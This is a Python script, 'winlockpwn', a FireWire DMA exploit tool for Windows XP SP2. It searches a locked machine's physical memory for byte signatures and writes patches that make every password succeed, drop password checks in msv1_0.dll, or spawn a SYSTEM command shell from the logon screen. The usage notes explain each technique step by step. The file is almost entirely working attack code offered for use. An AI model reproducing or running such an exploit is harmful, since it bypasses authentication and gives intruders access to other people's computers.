#!/usr/bin/python
# Windows locked screen remote firewire unlockor
# Metlstorm 2k6
# Uh, private use only, not for public distro, kthx.

import sys
import firewire
import binascii
import time

VER=1.5
VERSTR="Winlockpwn v%s Metlstorm, 2k6. <metlstorm@storm.net.nz>" % VER

# Targets are dicts, with some properties, and one or more phases
# each phase specifies a signature which can be found at one or more
# page offsets. When a signature is found the patch is applied at patchoffset
# bytes from the beginning of the signature. 

targets=[{
		"name":"WinXP SP2 Fast User Switching Unlock",
		"notes":"When run against a locked XPSP2 box with FUS on, it will cause all passwords to succeed. You'll still get the password-is-wrong dialog, but then you'll get logged in anyway.",
		"phase":[{
		"sig":"8BD8F7DB1ADBFEC3",
		"pageoffset":[2905],
		"patch":"bb01000000eb0990",
		"patchoffset":0}]
		},
		{"name":"WinXP SP2 Unlock",
		"notes":"When run against a locked XPSP2 box with regular non-fast-user-switching, it will cause all passwords to succeed. You'll still get the password-is-wrong dialog, but then you'll get logged in anyway.",
		"phase":[{
		"sig":"0502000010",
		"pageoffset":[3696],
		"patch":"b801000000",
		"patchoffset":0}]
		},
		{"name":"WinXP SP2 msv1_0.dll technique",
		 "notes":"Patches the call which decides if an account requires password authentication. This will cause all accounts to no longer require a password, which covers logging in, locking, and probably network authentication too! This is the best allround XPSP2 technique.",
		 "phase":[{
		 "sig":"8BFF558BEC83EC50A1",
		 "pageoffset":[0x927],
		 "patch":"B001",
		 "patchoffset":0xa5}]
		},
		{"name":"WinXP SP2 utilman cmd spawn",
		 "notes":"At the winlogon winstation (locked or prelogin), will spawn a system cmd shell. Start util manager with Win-U, and make sure all the disability-tools are stopped (narrator starts by default). Then run this, wait till it's patched a couple of data-phase things, then start narrator. Enjoy a shell. You can use this with the msv1_0.dll technique as well, and log in. Any time you want to get back to your shell, just lock the desktop, and you'll go back to the winlogon winstation where your shell will be waiting.",
		 "phase":[
		 {"name":"Patch code",
		 "sig":"535689bde8faffffff158810185b898540fbffff39bd40fbffff744e8b8524fb",
		 "pageoffset":[0x39f],
		 "patch":"565383c310899de8faffffff158810185b898540fbffff9090909090",
		 "patchoffset":0x0},
		 {"name":"Patch data",
		 "sig":"2f0055004d000000d420185b0539185b0000000053006f006600740077006100",
		 "pageoffset":[0x9ac, 0x5ac, 0x3ac],
		 "patch":"63006d0064002e006500780065000000570069006e0053007400610030005c00570069006e006c006f0067006f006e0000",
		 "patchoffset":0x0,
		 "keepgoing":True,
		 }
		 ]
		}
		]


start = 0x8000000L
end   = 0xffffffffL
chunk = 4096 

print VERSTR

def printTargets(targets):
	i = 1
	print " Available Targets:"
	for t in targets:
		print " %2d: %s" % (i, t["name"])
		i+=1
	print "\nTarget Notes:\n"	
	for t in targets:
		print "%s:\n---------------\n%s\n" % (t["name"], t["notes"])
		
def usage():
	print "Usage: winlockpwn port node target [start-end]"
	print " - Port and node are the firewire port and node numbers. Use businfo to identify your targets port and node numbers."
	print " - Target should be one of the numbered targets listed below."
	print " - You can optionally supply a start-end memory range to search for signatures in, useful if you're restarting, or want to limit the upper end of memory (which will otherwise walk up to 4GB without stopping). This understands anything sensible; eg 0-100M, 0xffff-0x1ffff, 1m-, 200k-1GB, -0xffff."
	print "(Remember that you'll need to use CSR trickery with romtool to talk DMA to windows.)\n"
	printTargets(targets)
	sys.exit(1)

if len(sys.argv) < 4:
	usage()

try:
	port = int(sys.argv[1])
	node = int(sys.argv[2])
	targetno = int(sys.argv[3])
	if len(sys.argv) > 4:
		start,end = firewire.parseRange(sys.argv[4])
		if end == None:
			end = 0xffffffffL
except ValueError:
	usage()

if targetno < 1 or targetno > len(targets):
	usage()

target = targets[targetno -1]

print "Target Selection:"
print " Name   : %s" % target["name"]
print " Notes  : %s" % target["notes"]
for p in target["phase"]:
	if p.has_key("name"):
		print "Phase: %s" % p["name"]
	print " Pattern: 0x%s" % p["sig"]
	print " Offset : %s" % p["pageoffset"]
	print " Patch  : 0x%s" % p["patch"]
	print " Offset : %d" % p["patchoffset"]
print "Scanning Options:"
print " Start  : 0x%x" % start
print " Stop   : 0x%x" % end
print " Pagesz : %d" % chunk

for so in p["pageoffset"]:
	if len(p["sig"]) + so > chunk:
		print "Uh oh, signature crosses page boundary. This isn't supported :("
		sys.exit(1)
	if so + p["patchoffset"] > chunk:
		print "Uh oh, patch offset crosses page boundary. This isn't supported :("
		sys.exix(1)



print "Init firwire, port %d node %d" % (port, node)
h = firewire.Host()
n = h[port][node]

print "Snarfin' memories..."
sys.stdout.flush()

dumppage = False
won = False

startt = time.time()
last = 0
for p in target["phase"]:
	try:
		print "Phase: %s" % p["name"]
	except KeyError:
		pass
	signatureoffset=p["pageoffset"]
	eviloffset = p["patchoffset"]
	payload = binascii.unhexlify(p["patch"])
	pattern = binascii.unhexlify(p["sig"]) 
	eviladdr = None
	for offset in range(start, end, chunk):
		now = time.time()
		if now > (last + 1):
			last = now
			print "\rChecking for signature on page at 0x%08x (%dkB) at %d kB/s..." % (offset, offset / 1024, (offset - start) / (now - startt) / 1024 ),
			sys.stdout.flush()

		for so in signatureoffset:
			mem = n.read(offset + so , len(pattern))
			if mem == pattern:
				print "Found signature at 0x%08x" % (offset + so)
				eviladdr = offset + so + p["patchoffset"]
				if dumppage:
					fo = open("winlockpwn.dumppage.0x%08x" % offset, "w")
					fo.write(n.read(offset, chunk))
					fo.close()
				break
		if eviladdr != None:
			won = True
			print "Setting up teh bomb...",
			n.write(eviladdr, payload) 
			print "Donezor!"
			verify=n.read(eviladdr, len(payload))
			print "Verified evil: 0x%s" % (binascii.hexlify(verify))
			if dumppage:
				fo = open("winlockpwn.dumppage.0x%08x.patched" % offset, "w")
				fo.write(n.read(offset, chunk))
				fo.close()
			if p.has_key("keepgoing") and p["keepgoing"]:
				eviladdr = None
			else:
				break


if won:
	print "You may proceed with your nefarious plans"
else:
	print "\nOh noes, you didn't win"
endt = time.time()
print "Elapsed time %d seconds" % (endt - startt)

